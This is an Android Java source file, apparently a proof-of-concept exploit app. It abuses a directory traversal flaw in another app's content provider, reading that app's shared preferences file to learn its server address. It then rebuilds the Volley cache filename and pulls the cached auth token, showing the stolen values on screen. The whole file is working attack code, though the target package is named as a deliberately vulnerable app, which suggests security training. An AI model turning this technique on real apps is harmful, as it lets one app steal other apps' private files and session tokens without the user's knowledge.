package dev.d0nut.exploit.exploitdirectorytraversal;

import android.app.Activity;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

import androidx.annotation.Nullable;

import java.io.ByteArrayOutputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String serverAddress = readServerAddress();

        Toast.makeText(this, serverAddress, Toast.LENGTH_SHORT).show();

        String endpoint = serverAddress + "/api/auth";

        Toast.makeText(this, getToken(endpoint), Toast.LENGTH_SHORT).show();
    }

    private String readServerAddress() {
        String preferencesFileContents = readRemoteFile("../shared_prefs/preferences.xml");

        Pattern pattern = Pattern.compile("server_address\">([^<]+)");
        Matcher matcher = pattern.matcher(preferencesFileContents);

        matcher.find();

        return matcher.group(1);
    }

    private String getToken(String serverAddress) {
        String cacheFileContents = readRemoteFile("../cache/volley/" + calculateCacheFilename(serverAddress));

        Pattern pattern = Pattern.compile("\"token\":\"([^\"]+)");
        Matcher matcher = pattern.matcher(cacheFileContents);

        matcher.find();

        return matcher.group(1);
    }

    private String calculateCacheFilename(String serverAddress) {
        String key = "1-" + serverAddress;

        int firstHalfLength = key.length() / 2;
        String localFilename = String.valueOf(key.substring(0, firstHalfLength).hashCode());
        localFilename += String.valueOf(key.substring(firstHalfLength).hashCode());
        return localFilename;
    }

    private String readRemoteFile(String path) {
        Uri contentUri = Uri.parse("content://dev.d0nut.vuln.fileapp.fileprovider/" + path);

        try {
            InputStream stream = getContentResolver().openInputStream(contentUri);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();

            int nRead;
            byte[] bytes = new byte[16000];

            while((nRead = stream.read(bytes,0, bytes.length)) != -1) {
                buffer.write(bytes);
            }

            return new String(buffer.toByteArray(), "UTF-8");

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }
}
